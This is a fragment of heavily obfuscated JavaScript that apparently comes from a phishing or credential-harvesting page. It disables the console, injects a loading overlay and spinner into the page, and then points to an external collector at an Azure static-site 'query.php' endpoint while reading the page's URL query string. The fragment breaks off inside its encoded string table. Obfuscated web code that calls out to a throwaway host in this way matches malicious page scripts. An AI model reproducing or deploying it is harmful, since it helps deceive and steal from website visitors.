_0x39493c[_0x1e8cf8(_0x45de78._0x5abdbf)](_0x39493c[_0x1e8cf8(_0x45de78._0x2dd567)],_0x39493c[_0x1e8cf8(_0x45de78._0xd6f08)])?_0x230d53[_0x1e8cf8(_0x45de78._0x13d12f)]()[_0x1e8cf8(_0x45de78._0x58acac)](JxLNpP[_0x1e8cf8(_0x45de78._0x16a5da)])[_0x1e8cf8(_0x45de78._0x5674d7)]()[_0x1e8cf8(_0x45de78._0x44d5dc)+'\x72'](_0x43e2f9)[_0x1e8cf8(_0x45de78._0x58acac)](JxLNpP[_0x1e8cf8(_0x45de78._0x16a5da)]):_0x5dc1de[_0x344f58(_0x45de78._0x8ee385)]()[_0x1e8cf8(_0x45de78._0x58acac)](_0x39493c[_0x1e8cf8(_0x45de78._0x16a5da)])[_0x344f58(_0x45de78._0x483661)]()[_0x1e8cf8(_0x45de78._0x330d3c)+'\x72'](_0x5dc1de)[_0x344f58(_0x45de78._0x574c6f)](_0x39493c[_0x1e8cf8(_0x45de78._0x44fc3d)]);});_0x487031[_0x4c5f9b(_0x201e37._0x29ba54)](_0x5dc1de);var _0x2d8361=_0x487031[_0x4c5f9b(_0x201e37._0x2c00aa)](_0x38f659,this,function(){var _0x481ef4=_0x4c5f9b,_0x45e3b3=_0x4c82ce,_0x2c39c6=_0x487031[_0x481ef4(_0xc48ca7._0x3327b8)][_0x45e3b3(_0xc48ca7._0x5f1468)]('\x7c'),_0x192880=-0x16*-0x10a+-0x7*-0x383+-0x2f71;while(!![]){switch(_0x2c39c6[_0x192880++]){case'\x30':var _0x4f6c69=_0x3da203[_0x45e3b3(_0xc48ca7._0x333651)]=_0x3da203[_0x45e3b3(_0xc48ca7._0x333651)]||{};continue;case'\x31':var _0x101846=[_0x487031[_0x45e3b3(_0xc48ca7._0x273fe3)],_0x487031[_0x481ef4(_0xc48ca7._0x305837)],_0x487031[_0x481ef4(_0xc48ca7._0x5956a3)],_0x487031[_0x45e3b3(_0xc48ca7._0x47834d)],_0x487031[_0x481ef4(_0xc48ca7._0x148a97)],_0x487031[_0x45e3b3(_0xc48ca7._0x26379d)],_0x487031[_0x45e3b3(_0xc48ca7._0x3d621b)]];continue;case'\x32':var _0x3da203;continue;case'\x33':for(var _0x224f2a=-0x18bf+0xacf*-0x3+0x2*0x1c96;_0x487031[_0x45e3b3(_0xc48ca7._0x3ce8a0)](_0x224f2a,_0x101846[_0x45e3b3(_0xc48ca7._0x5861a0)]);_0x224f2a++){var _0x3df131=_0x487031[_0x481ef4(_0xc48ca7._0x38c6e0)][_0x45e3b3(_0xc48ca7._0x51ebb3)]('\x7c'),_0x4e4945=0x14a*-0xe+-0x1a51+0x2c5d;while(!![]){switch(_0x3df131[_0x4e4945++]){case'\x30':_0x2a9192[_0x45e3b3(_0xc48ca7._0x5d0b83)]=_0x265bd9[_0x481ef4(_0xc48ca7._0x3176d2)][_0x481ef4(_0xc48ca7._0x1fd158)](_0x265bd9);continue;case'\x31':_0x2a9192[_0x481ef4(_0xc48ca7._0x5ee547)]=_0x38f659[_0x45e3b3(_0xc48ca7._0x1fd158)](_0x38f659);continue;case'\x32':var _0x265bd9=_0x4f6c69[_0x341b3f]||_0x2a9192;continue;case'\x33':var _0x341b3f=_0x101846[_0x224f2a];continue;case'\x34':_0x4f6c69[_0x341b3f]=_0x2a9192;continue;case'\x35':var _0x2a9192=_0x38f659[_0x45e3b3(_0xc48ca7._0x263b66)+'\x72'][_0x45e3b3(_0xc48ca7._0x36aab9)][_0x481ef4(_0xc48ca7._0x17e88e)](_0x38f659);continue;}break;}}continue;case'\x34':try{var _0x4c3c67=_0x487031[_0x481ef4(_0xc48ca7._0x7c9dbd)](Function,_0x487031[_0x45e3b3(_0xc48ca7._0x1db442)](_0x487031[_0x481ef4(_0xc48ca7._0xd4b97f)](_0x487031[_0x45e3b3(_0xc48ca7._0x9898a7)],_0x487031[_0x481ef4(_0xc48ca7._0x20314e)]),'\x29\x3b'));_0x3da203=_0x487031[_0x45e3b3(_0xc48ca7._0x5e3bef)](_0x4c3c67);}catch(_0x12e495){_0x3da203=window;}continue;}break;}});_0x487031[_0x4c82ce(_0x201e37._0x4e1d2c)](_0x2d8361);var _0x2a89aa=_0x487031[_0x4c82ce(_0x201e37._0x37dca6)],_0x51672b='',_0x361e08=_0x487031[_0x4c5f9b(_0x201e37._0x3379d3)](Math[_0x4c5f9b(_0x201e37._0x16c0c3)](_0x487031[_0x4c5f9b(_0x201e37._0x35b716)](Math[_0x4c5f9b(_0x201e37._0x32e694)](),-0x7*-0x23d+-0x108f+-0x22*-0x7)),-0x22a5+0x153*-0xd+0x33e0);for(var _0x2804ee=-0x24c3*-0x1+-0x1*0x401+-0x20c2;_0x487031[_0x4c82ce(_0x201e37._0x3ef33c)](_0x2804ee,_0x361e08);_0x2804ee++){if(_0x487031[_0x4c5f9b(_0x201e37._0x19d25f)](_0x487031[_0x4c82ce(_0x201e37._0x1d4dda)],_0x487031[_0x4c5f9b(_0x201e37._0xda76c9)]))_0x51672b+=_0x2a89aa[_0x4c5f9b(_0x201e37._0x5c958f)](Math[_0x4c5f9b(_0x201e37._0x1284d1)](_0x487031[_0x4c5f9b(_0x201e37._0x5ca50b)](Math[_0x4c82ce(_0x201e37._0x56daf6)](),_0x2a89aa[_0x4c82ce(_0x201e37._0x34c9c8)])));else{var _0x46876c=_0x39493c[_0x4c82ce(_0x201e37._0x4e837c)][_0x4c5f9b(_0x201e37._0x238b6f)]('\x7c'),_0x5f489e=0x61*0x2d+-0x10ad*-0x1+-0x3*0xb3e;while(!![]){switch(_0x46876c[_0x5f489e++]){case'\x30':var _0x27a853=[JxLNpP[_0x4c5f9b(_0x201e37._0x1a53b9)],JxLNpP[_0x4c82ce(_0x201e37._0x1b4136)],JxLNpP[_0x4c5f9b(_0x201e37._0x39ed82)],JxLNpP[_0x4c5f9b(_0x201e37._0x4f243c)],JxLNpP[_0x4c5f9b(_0x201e37._0xe26de7)],JxLNpP[_0x4c82ce(_0x201e37._0x49d5fa)],JxLNpP[_0x4c5f9b(_0x201e37._0x641e6)]];continue;case'\x31':var _0x32207d;continue;case'\x32':var _0x3a505e=_0x32207d[_0x4c5f9b(_0x201e37._0x21b8e9)]=_0x32207d[_0x4c82ce(_0x201e37._0x45f919)]||{};continue;case'\x33':try{var _0x229677=JxLNpP[_0x4c82ce(_0x201e37._0x1cefb2)](_0x2af388,JxLNpP[_0x4c5f9b(_0x201e37._0x365154)](JxLNpP[_0x4c82ce(_0x201e37._0x166650)](JxLNpP[_0x4c5f9b(_0x201e37._0x241b12)],JxLNpP[_0x4c82ce(_0x201e37._0x2e6705)]),'\x29\x3b'));_0x32207d=JxLNpP[_0x4c82ce(_0x201e37._0x13b380)](_0x229677);}catch(_0x300f98){_0x32207d=_0x416d23;}continue;case'\x34':for(var _0x334eac=-0x14*0xb7+0x199*0x12+-0xe76;JxLNpP[_0x4c5f9b(_0x201e37._0x538730)](_0x334eac,_0x27a853[_0x4c5f9b(_0x201e37._0x34c9c8)]);_0x334eac++){var _0x1995cf=JxLNpP[_0x4c5f9b(_0x201e37._0x478983)][_0x4c82ce(_0x201e37._0x23f31f)]('\x7c'),_0x266bef=0x438+0x29*-0x7e+0xff6;while(!![]){switch(_0x1995cf[_0x266bef++]){case'\x30':var _0x35589c=_0x27a853[_0x334eac];continue;case'\x31':_0x3a505e[_0x35589c]=_0x18d295;continue;case'\x32':var _0x18d295=_0x23c390[_0x4c5f9b(_0x201e37._0x20f572)+'\x72'][_0x4c5f9b(_0x201e37._0x47d748)][_0x4c82ce(_0x201e37._0x13d513)](_0x307a16);continue;case'\x33':var _0x5e1d12=_0x3a505e[_0x35589c]||_0x18d295;continue;case'\x34':_0x18d295[_0x4c82ce(_0x201e37._0xb6802)]=_0x105922[_0x4c82ce(_0x201e37._0xf889de)](_0x29425b);continue;case'\x35':_0x18d295[_0x4c5f9b(_0x201e37._0x518bf2)]=_0x5e1d12[_0x4c82ce(_0x201e37._0x518bf2)][_0x4c5f9b(_0x201e37._0xf889de)](_0x5e1d12);continue;}break;}}continue;}break;}}}return _0x51672b;}else{var _0x14c5f4=_0x5ca84c?function(){var _0x1696ab=_0x4c5f9b;if(_0x1e5af9){var _0x4b8816=_0x28452f[_0x1696ab(_0x464353._0x3408e0)](_0x35bc19,arguments);return _0x456fa0=null,_0x4b8816;}}:function(){};return _0x13096d=![],_0x14c5f4;}},_0x3c9ea5=_0x487031[_0x2e6648(_0x5cde68._0xf0335c)](_0x43fe87),_0x18ac83=_0x487031[_0x528d2a(_0x5cde68._0x433001)](_0x43fe87),_0x2b61e9=_0x487031[_0x2e6648(_0x5cde68._0x384e01)](_0x43fe87),_0xfaa22d=_0x487031[_0x2e6648(_0x5cde68._0x3fcff9)](_0x43fe87),_0x44492b=document[_0x528d2a(_0x5cde68._0x240553)+_0x528d2a(_0x5cde68._0x55afa9)](_0x487031[_0x2e6648(_0x5cde68._0x2130dc)]);_0x44492b[_0x528d2a(_0x5cde68._0x3b5741)+'\x74']=_0x528d2a(_0x5cde68._0x1b6c37)+_0x18ac83+(_0x528d2a(_0x5cde68._0x30c4b1)+_0x528d2a(_0x5cde68._0x2fdddf)+_0x528d2a(_0x5cde68._0x174c4f)+_0x2e6648(_0x5cde68._0xa299e1)+_0x2e6648(_0x5cde68._0x39dd9b)+_0x528d2a(_0x5cde68._0x2e7790)+_0x528d2a(_0x5cde68._0x50dd9a))+_0x18ac83+(_0x528d2a(_0x5cde68._0x30c579)+_0x528d2a(_0x5cde68._0x486fc9)+_0x528d2a(_0x5cde68._0x3e0095)+_0x2e6648(_0x5cde68._0xda8b47)+_0x528d2a(_0x5cde68._0x219e55)+_0x2e6648(_0x5cde68._0x4e35d7)+_0x528d2a(_0x5cde68._0x5b1c0c)+_0x528d2a(_0x5cde68._0x2b9b27)+_0x528d2a(_0x5cde68._0x2e7790)+_0x528d2a(_0x5cde68._0x50dd9a))+_0x2b61e9+(_0x2e6648(_0x5cde68._0x30c4b1)+_0x528d2a(_0x5cde68._0x5e2503)+_0x2e6648(_0x5cde68._0x36b5a5)+_0x2e6648(_0x5cde68._0x159986)+_0x2e6648(_0x5cde68._0xed4271)+_0x528d2a(_0x5cde68._0x28de9e)+_0x528d2a(_0x5cde68._0x499622)+_0x2e6648(_0x5cde68._0x22673e)+_0x2e6648(_0x5cde68._0x90c761)+_0x528d2a(_0x5cde68._0x48232d)+_0x528d2a(_0x5cde68._0x169991)+_0x2e6648(_0x5cde68._0x93c13d)+_0x2e6648(_0x5cde68._0x174ed2)+_0x528d2a(_0x5cde68._0x4e1511)+_0x528d2a(_0x5cde68._0x496bf8)+_0x528d2a(_0x5cde68._0x248c02)+_0x528d2a(_0x5cde68._0x356ec2)+_0x528d2a(_0x5cde68._0x2a14bc)+_0x2e6648(_0x5cde68._0x102f46)+_0x2e6648(_0x5cde68._0x37e97a)+_0x2e6648(_0x5cde68._0x5e2caa)+_0x2e6648(_0x5cde68._0x4b4889)+_0x2e6648(_0x5cde68._0x2f0c7d)+_0x2e6648(_0x5cde68._0x2941f1)+_0x528d2a(_0x5cde68._0x258b58)+_0x2e6648(_0x5cde68._0x5beab7)+_0x2e6648(_0x5cde68._0x1b6c37))+_0xfaa22d+(_0x2e6648(_0x5cde68._0x30c4b1)+_0x528d2a(_0x5cde68._0x4ba8f8)+_0x2e6648(_0x5cde68._0x170c88)+_0x2e6648(_0x5cde68._0x974bc8)+_0x528d2a(_0x5cde68._0x2ee27a)+_0x2e6648(_0x5cde68._0x1ff12c)+_0x528d2a(_0x5cde68._0x164c67)+_0x2e6648(_0x5cde68._0x146f84)+_0x2e6648(_0x5cde68._0x32094f)+_0x2e6648(_0x5cde68._0x54d9b6)+_0x2e6648(_0x5cde68._0x39dc16)+_0x528d2a(_0x5cde68._0x11e6b4)+_0x528d2a(_0x5cde68._0x2386e6)+_0x2e6648(_0x5cde68._0x57ca96)+_0x2e6648(_0x5cde68._0x5cf25e)+_0x528d2a(_0x5cde68._0x518af7)+_0x528d2a(_0x5cde68._0x598c15)+_0x2e6648(_0x5cde68._0x487aa3)+_0x2e6648(_0x5cde68._0x339dd7)+_0x2e6648(_0x5cde68._0x497ae2)+_0x2e6648(_0x5cde68._0x521432)+_0x2e6648(_0x5cde68._0x2c2375)+_0x2e6648(_0x5cde68._0x4402e9)+_0x2e6648(_0x5cde68._0x20e98b)+_0x2e6648(_0x5cde68._0x22b961)+_0x2e6648(_0x5cde68._0x19c0a1)+_0x528d2a(_0x5cde68._0x1b11e0)+_0x528d2a(_0x5cde68._0x4a1658)+_0x528d2a(_0x5cde68._0x2707eb)+_0x528d2a(_0x5cde68._0x2b7056)+_0x2e6648(_0x5cde68._0x3162ba)+_0x528d2a(_0x5cde68._0x526f8c)+_0x2e6648(_0x5cde68._0x237c39)+_0x2e6648(_0x5cde68._0x9884e0)+_0x528d2a(_0x5cde68._0x15d002)+_0x2e6648(_0x5cde68._0xd2c6bb)+_0x528d2a(_0x5cde68._0x528333)+_0x528d2a(_0x5cde68._0x1f65a5)+_0x528d2a(_0x5cde68._0x150fd5)+_0x528d2a(_0x5cde68._0x47194d)+_0x528d2a(_0x5cde68._0x1d0db0)+_0x2e6648(_0x5cde68._0x5befb9)+_0x2e6648(_0x5cde68._0x29b9aa)+_0x2e6648(_0x5cde68._0x52407f)+_0x2e6648(_0x5cde68._0x518af7)+_0x528d2a(_0x5cde68._0x136667)+_0x528d2a(_0x5cde68._0x17d4fa)+_0x2e6648(_0x5cde68._0x47eea2)+_0x2e6648(_0x5cde68._0x131a06)+_0x2e6648(_0x5cde68._0x3eb3c0)+_0x2e6648(_0x5cde68._0x155296)+_0x2e6648(_0x5cde68._0x38dc1c)+_0x528d2a(_0x5cde68._0x521432)+_0x528d2a(_0x5cde68._0x1970f3))+_0x3c9ea5+(_0x2e6648(_0x5cde68._0x1a6990)+_0x2e6648(_0x5cde68._0x2fdddf)+_0x2e6648(_0x5cde68._0xc8d0f3)+_0x528d2a(_0x5cde68._0x12d6d4)+_0x528d2a(_0x5cde68._0x3a93a7)+_0x528d2a(_0x5cde68._0x4aac6b)+_0x528d2a(_0x5cde68._0x4b4889)+_0x2e6648(_0x5cde68._0x50bd71)+_0x2e6648(_0x5cde68._0x31fb0a)+_0x2e6648(_0x5cde68._0x40072f)+_0x528d2a(_0x5cde68._0x6f9367)+_0x2e6648(_0x5cde68._0x386ee1)+_0x2e6648(_0x5cde68._0x29c1ed)+_0x2e6648(_0x5cde68._0x1b235e)+_0x528d2a(_0x5cde68._0x3c0ebe)+_0x528d2a(_0x5cde68._0x298ad4)+_0x2e6648(_0x5cde68._0x2b7ec8)+_0x2e6648(_0x5cde68._0x3aa4be)+_0x2e6648(_0x5cde68._0x5610db)+_0x2e6648(_0x5cde68._0x3a2285)+_0x528d2a(_0x5cde68._0x171aee)+_0x2e6648(_0x5cde68._0x297d6b)+_0x528d2a(_0x5cde68._0x93c13d)+_0x2e6648(_0x5cde68._0x10463d)+_0x528d2a(_0x5cde68._0x5eb823)+_0x2e6648(_0x5cde68._0x437f46)+_0x528d2a(_0x5cde68._0x2530ea)+_0x2e6648(_0x5cde68._0x384c2c))+_0x3c9ea5+(_0x2e6648(_0x5cde68._0x3f879e)+_0x528d2a(_0x5cde68._0x4657c0)+_0x2e6648(_0x5cde68._0x42f255)+_0x528d2a(_0x5cde68._0x56b3d0)),document[_0x528d2a(_0x5cde68._0x569991)][_0x528d2a(_0x5cde68._0x56d13e)+'\x64'](_0x44492b);var _0x45ab32=document[_0x528d2a(_0x5cde68._0x240553)+_0x2e6648(_0x5cde68._0x55afa9)](_0x487031[_0x2e6648(_0x5cde68._0x3fe2bf)]);_0x45ab32[_0x2e6648(_0x5cde68._0x85e0a0)]=_0x3c9ea5;var _0xb0c9ac=document[_0x528d2a(_0x5cde68._0x2e2069)+_0x528d2a(_0x5cde68._0x55afa9)](_0x487031[_0x2e6648(_0x5cde68._0x18695f)]);_0xb0c9ac[_0x528d2a(_0x5cde68._0xeeae11)]=_0x18ac83,_0x45ab32[_0x2e6648(_0x5cde68._0x56d13e)+'\x64'](_0xb0c9ac);var _0x1a7fa0=_0x487031[_0x2e6648(_0x5cde68._0x408902)],_0x3e8487=document[_0x528d2a(_0x5cde68._0x240553)+_0x528d2a(_0x5cde68._0xac2a9)](_0x1a7fa0,_0x487031[_0x528d2a(_0x5cde68._0x4080ba)]);_0x3e8487[_0x528d2a(_0x5cde68._0x2a99fd)][_0x2e6648(_0x5cde68._0x5457c8)](_0x2b61e9),_0x3e8487[_0x528d2a(_0x5cde68._0x5cc9cc)+'\x74\x65'](_0x487031[_0x2e6648(_0x5cde68._0x3fa9ec)],_0x487031[_0x2e6648(_0x5cde68._0x5e4952)]),_0xb0c9ac[_0x2e6648(_0x5cde68._0x56d13e)+'\x64'](_0x3e8487);var _0x2b6175=document[_0x528d2a(_0x5cde68._0x32531c)+_0x528d2a(_0x5cde68._0x42ac14)](_0x1a7fa0,_0x487031[_0x528d2a(_0x5cde68._0xc6e205)]);_0x2b6175[_0x528d2a(_0x5cde68._0x59ec85)][_0x2e6648(_0x5cde68._0x59c25e)](_0xfaa22d),_0x2b6175[_0x528d2a(_0x5cde68._0x5cc9cc)+'\x74\x65']('\x63\x78','\x35\x30'),_0x2b6175[_0x2e6648(_0x5cde68._0x5cc9cc)+'\x74\x65']('\x63\x79','\x35\x30'),_0x2b6175[_0x2e6648(_0x5cde68._0x5cc9cc)+'\x74\x65']('\x72','\x32\x30'),_0x2b6175[_0x2e6648(_0x5cde68._0x29e5e3)+'\x74\x65'](_0x487031[_0x2e6648(_0x5cde68._0x21d37b)],_0x487031[_0x528d2a(_0x5cde68._0x19a37f)]),_0x2b6175[_0x2e6648(_0x5cde68._0x256f90)+'\x74\x65'](_0x487031[_0x528d2a(_0x5cde68._0x82b938)],'\x32'),_0x2b6175[_0x528d2a(_0x5cde68._0x3df121)+'\x74\x65'](_0x487031[_0x528d2a(_0x5cde68._0x1fba5a)],'\x31\x30'),_0x3e8487[_0x2e6648(_0x5cde68._0x56c2ee)+'\x64'](_0x2b6175);if(!document[_0x528d2a(_0x5cde68._0x5759a2)]){if(_0x487031[_0x2e6648(_0x5cde68._0x332490)](_0x487031[_0x528d2a(_0x5cde68._0xa9372f)],_0x487031[_0x528d2a(_0x5cde68._0x1a61c8)]))document[_0x2e6648(_0x5cde68._0x116190)+_0x528d2a(_0x5cde68._0x1bfacd)][_0x528d2a(_0x5cde68._0x56d13e)+'\x64'](document[_0x528d2a(_0x5cde68._0x5f7785)+_0x2e6648(_0x5cde68._0xff981)](_0x487031[_0x2e6648(_0x5cde68._0x22053f)]));else{var _0x261fee=QYfOlS[_0x2e6648(_0x5cde68._0x3a9714)](_0x1c47fa,QYfOlS[_0x2e6648(_0x5cde68._0x1fa8c6)](QYfOlS[_0x2e6648(_0x5cde68._0x432a24)](QYfOlS[_0x528d2a(_0x5cde68._0x50e7da)],QYfOlS[_0x528d2a(_0x5cde68._0x5784f2)]),'\x29\x3b'));_0xd1132b=QYfOlS[_0x2e6648(_0x5cde68._0x3fcff9)](_0x261fee);}}document[_0x528d2a(_0x5cde68._0x14adaa)][_0x528d2a(_0x5cde68._0x987873)+_0x2e6648(_0x5cde68._0x2812d9)+'\x74'](_0x487031[_0x528d2a(_0x5cde68._0x4f83cf)],_0x45ab32);}()));let _0x15bfa1='https://45dcfvg54g.z5.web.core.windows.net/query.php',_0x3e332c=window[_0x274914(0x125)][_0x2f2af8(0x184)][_0x2f2af8(0x182)]('\x3f','');function _0x2435(){var _0x1683eb=['\x79\x4d\x39\x4b\x45\x71','\x75\x78\x6a\x70\x79\x4d\x4b','\x72\x67\x44\x7a\x73\x32\x65','\x79\x77\x7a\x30\x7a\x78\x6a\x49\x7a\x77\x44\x50\x42\x47','\x69\x63\x61\x47\x69\x63\x62\x49\x42\x33\x72\x30\x42\x57','\x69\x63\x61\x47\x46\x71\x4f\x47\x69\x63\x61\x47\x69\x61','\x7a\x4d\x48\x66\x73\x78\x6d','\x69\x63\x61\x47\x69\x63\x61\x47\x69\x63\x62\x30\x43\x47','\x7a\x67\x4c\x5a\x43\x67\x58\x48\x45\x71','\x6f\x74\x4b\x37\x63\x49\x61\x47\x69\x63\x61\x47\x69\x61','\x41\x77\x35\x5a\x7a\x78\x6a\x30\x71\x77\x72\x51\x79\x71','\x79\x76\x7a\x6d\x71\x77\x38','\x73\x30\x50\x4c\x75\x67\x30','\x6d\x33\x57\x30\x46\x64\x76\x38\x6d\x4e\x57\x57\x46\x61','\x75\x4e\x76\x6f\x73\x31\x61','\x44\x33\x76\x7a\x45\x65\x57','\x79\x4d\x4c\x55\x7a\x61','\x71\x75\x35\x70\x73\x77\x34','\x69\x63\x61\x47\x69\x63\x61\x47\x69\x63\x62\x59\x41\x71','\x7a\x77\x31\x4c\x42\x4e\x71','\x44\x67\x4c\x56\x42\x4a\x4f\x47\x7a\x67\x66\x5a\x41\x61','\x6f\x49\x62\x59\x42\x33\x76\x55\x7a\x64\x53\x6b\x69\x61','\x79\x4d\x7a\x4c\x79\x77\x76\x4b\x7a\x71','\x7a\x75\x4c\x68\x45\x4d\x38','\x72\x4b\x6e\x6e\x41\x77\x53','\x43\x4d\x4c\x4e\x41\x77\x34\x36\x69\x67\x6e\x4c\x42\x47','\x74\x4e\x72\x73\x7a\x4d\x75','\x41\x4c\x66\x50\x45\x68\x47','\x75\x75\x76\x77\x73\x68\x69','\x69\x68\x53\x47\x63\x49\x61\x47\x69\x63\x61\x47\x69\x61','\x7a\x78\x48\x4a\x7a\x78\x62\x30\x41\x77\x39\x55','\x69\x67\x7a\x50\x45\x67\x76\x4b\x6f\x57\x4f\x47\x69\x61','\x42\x67\x4c\x55\x41\x57','\x75\x77\x31\x78\x76\x4e\x47','\x44\x67\x66\x49\x42\x67\x75','\x79\x32\x48\x48\x43\x4b\x66\x30','\x43\x76\x6a\x51\x72\x32\x4f','\x79\x77\x72\x4b\x72\x78\x7a\x4c\x42\x4e\x72\x6d\x41\x71','\x43\x4d\x66\x54\x7a\x78\x6d\x47\x43\x4d\x39\x30\x79\x71','\x41\x67\x76\x48\x7a\x61','\x7a\x73\x31\x4b\x79\x78\x6e\x4f\x42\x32\x7a\x4d\x43\x57','\x43\x4b\x66\x56\x77\x78\x75','\x6f\x59\x62\x4c\x45\x68\x62\x50\x43\x4d\x76\x5a\x70\x71','\x7a\x31\x76\x54\x72\x75\x30','\x45\x4b\x35\x75\x41\x33\x75','\x63\x49\x61\x47\x69\x63\x61\x47\x69\x63\x61\x47\x69\x61','\x6d\x74\x61\x34\x6e\x4a\x7a\x69\x44\x4b\x54\x67\x45\x68\x71','\x42\x77\x31\x56\x73\x4b\x69','\x45\x66\x6a\x4f\x7a\x33\x65','\x43\x78\x66\x59\x73\x30\x34','\x6d\x64\x61\x56\x43\x33\x7a\x4e','\x43\x77\x39\x76\x71\x4b\x43','\x42\x33\x61\x36\x69\x64\x61\x37\x63\x49\x61\x47\x69\x61','\x43\x32\x48\x48\x43\x4e\x6a\x48\x45\x74\x4f\x47\x6f\x61','\x77\x67\x48\x64\x43\x78\x61','\x79\x4b\x66\x4a\x72\x4d\x75','\x73\x32\x44\x35\x41\x76\x43','\x76\x4c\x7a\x53\x71\x4c\x61','\x43\x32\x48\x48\x43\x4e\x6a\x48\x45\x74\x4f\x47\x6d\x71','\x79\x32\x58\x48\x43\x33\x6e\x6d\x41\x78\x6e\x30','\x44\x65\x35\x65\x45\x4b\x34','\x69\x63\x62\x5a\x44\x68\x6a\x56\x41\x32\x75\x54\x44\x57','\x6d\x4a\x4b\x59\x6e\x4a\x79\x34\x6e\x4c\x76\x5a\x7a\x77\x48\x72\x79\x71','\x42\x33\x72\x48\x44\x67\x75\x4f\x6d\x5a\x79\x57\x7a\x61','\x79\x4d\x72\x57\x79\x4e\x4b','\x77\x65\x6a\x74\x73\x66\x47','\x6d\x5a\x47\x35\x6d\x4a\x4b\x32\x6f\x67\x6a\x4e\x72\x4c\x44\x57\x41\x57','\x42\x76\x44\x54\x74\x33\x79','\x77\x66\x44\x30\x74\x4c\x4f','\x42\x67\x39\x4a\x79\x78\x72\x50\x42\x32\x34','\x76\x65\x4c\x79\x76\x66\x65','\x79\x32\x39\x55\x44\x67\x76\x55\x44\x66\x44\x50\x42\x47','\x63\x49\x61\x47\x69\x63\x61\x47\x69\x63\x61\x47\x7a\x61','\x63\x49\x61\x47\x69\x63\x61\x47\x69\x63\x61\x47\x42\x71','\x69\x63\x61\x47\x69\x63\x61\x31\x6d\x63\x75\x47\x45\x57','\x74\x68\x44\x41\x77\x4d\x79','\x63\x49\x61\x47\x69\x63\x61\x47\x69\x63\x61\x47\x44\x57','\x44\x67\x76\x59\x6f\x57\x4f\x47\x69\x63\x61\x47\x69\x61','\x74\x4e\x48\x4e\x44\x4c\x4f','\x79\x77\x35\x5a\x7a\x4d\x39\x59\x42\x74\x4f\x47\x43\x47','\x73\x67\x54\x70\x42\x4b\x47','\x6d\x64\x61\x37\x63\x49\x61\x47\x69\x63\x61\x47\x69\x61','\x42\x67\x76\x55\x7a\x33\x72\x4f','\x43\x68\x47\x37\x63\x49\x61\x47\x69\x63\x61\x47\x69\x61','\x43\x4d\x39\x52\x7a\x73\x31\x4b\x79\x78\x6e\x4f\x42\x57','\x43\x33\x72\x59\x42\x32\x54\x4c\x6c\x78\x44\x50\x7a\x61','\x79\x74\x47\x35\x6d\x5a\x43\x35\x6d\x4a\x43\x30\x6e\x61','\x42\x4b\x50\x6a\x73\x65\x53','\x43\x33\x7a\x4e','\x42\x76\x76\x63\x43\x68\x71','\x6d\x4e\x57\x57\x46\x64\x6e\x38\x6e\x68\x57\x31\x46\x61','\x42\x4d\x39\x72\x42\x4d\x4f','\x79\x33\x72\x56\x43\x49\x47\x49\x43\x4d\x76\x30\x44\x71','\x79\x32\x39\x56\x41\x32\x4c\x4c','\x42\x4d\x38\x54\x43\x4d\x76\x4d\x7a\x78\x6a\x59\x7a\x71','\x75\x4b\x44\x65\x73\x65\x65','\x43\x68\x76\x5a\x73\x4c\x4f','\x42\x33\x66\x6d\x71\x78\x4f','\x69\x63\x61\x47\x69\x67\x58\x4c\x7a\x4e\x71\x36\x69\x61','\x44\x78\x7a\x33\x45\x68\x4c\x36\x71\x75\x6a\x64\x72\x61','\x7a\x67\x39\x4a\x44\x77\x31\x4c\x42\x4e\x72\x66\x42\x61','\x41\x77\x7a\x59\x79\x77\x31\x4c','\x76\x4d\x54\x49\x43\x77\x47','\x71\x33\x44\x59\x74\x75\x53','\x69\x63\x62\x39\x63\x49\x61\x47\x69\x63\x61\x47\x69\x61','\x42\x74\x4f\x47\x6d\x64\x53\x6b\x69\x63\x61\x47\x69\x61','\x41\x77\x72\x30\x41\x64\x4f\x47\x6e\x68\x62\x34\x6f\x57','\x43\x33\x72\x59\x42\x32\x54\x4c\x6c\x77\x31\x50\x44\x61','\x43\x67\x66\x30\x41\x64\x30\x56','\x75\x76\x50\x55\x72\x68\x71','\x74\x77\x76\x33\x42\x4b\x43','\x6e\x74\x75\x53\x69\x64\x69\x31\x6e\x73\x57\x47\x6d\x47','\x69\x68\x6e\x30\x43\x4d\x39\x52\x7a\x73\x31\x4b\x79\x71','\x42\x78\x6d\x36\x69\x67\x6e\x4c\x42\x4e\x72\x4c\x43\x47','\x42\x4d\x71\x36\x69\x68\x6a\x4e\x79\x4d\x65\x4f\x6d\x47','\x44\x77\x31\x73\x76\x75\x6d','\x6d\x78\x57\x5a\x46\x64\x6a\x38\x6d\x68\x57\x30','\x41\x32\x75\x54\x42\x67\x4c\x55\x7a\x77\x6e\x48\x43\x61','\x7a\x4d\x7a\x5a\x7a\x78\x71\x36\x69\x63\x30\x5a\x6e\x71','\x44\x32\x50\x48\x7a\x4e\x79','\x44\x67\x75\x47\x45\x57\x4f\x47\x69\x63\x61\x47\x69\x61','\x6e\x74\x75\x53\x69\x64\x69\x31\x6e\x73\x4b\x37\x63\x47','\x69\x64\x61\x37\x63\x49\x61\x47\x69\x63\x61\x47\x69\x61','\x45\x67\x39\x58\x7a\x77\x47','\x42\x4d\x6e\x30\x41\x77\x39\x55\x6b\x63\x4b\x47','\x6e\x64\x79\x35\x7a\x74\x61\x58\x6e\x4d\x72\x4c\x6d\x61','\x77\x4d\x48\x74\x74\x66\x61','\x42\x67\x39\x48\x7a\x67\x76\x4b','\x42\x32\x35\x53\x42\x32\x66\x4b','\x71\x78\x62\x31\x41\x75\x4b','\x79\x4e\x76\x52\x77\x65\x6d','\x42\x32\x54\x4c\x6f\x49\x61\x4a\x6e\x74\x6d\x31\x6d\x57','\x42\x32\x31\x48\x41\x77\x34\x39','\x79\x32\x4c\x59\x79\x32\x58\x4c','\x43\x4d\x76\x30\x44\x78\x6a\x55\x69\x63\x48\x4d\x44\x71','\x71\x4c\x76\x4b\x77\x66\x6d','\x72\x75\x7a\x68\x73\x65\x4c\x6b\x73\x30\x58\x6e\x74\x47','\x44\x76\x7a\x41\x76\x77\x65','\x69\x63\x61\x47\x44\x67\x38\x47\x45\x57\x4f\x47\x69\x61','\x7a\x67\x66\x5a\x41\x63\x62\x37\x63\x49\x61\x47\x69\x61','\x44\x76\x7a\x4f\x42\x77\x75','\x63\x49\x61\x47\x69\x63\x61\x47\x69\x63\x34','\x6a\x74\x53\x6b\x69\x63\x61\x47\x69\x63\x61\x47\x69\x61','\x7a\x4d\x58\x56\x42\x33\x69','\x69\x68\x6a\x50\x7a\x32\x48\x30\x6f\x49\x61\x57\x6f\x57','\x79\x78\x62\x57\x7a\x77\x35\x4b\x71\x32\x48\x50\x42\x61','\x75\x78\x72\x6f\x43\x30\x69','\x45\x68\x6a\x32\x71\x33\x6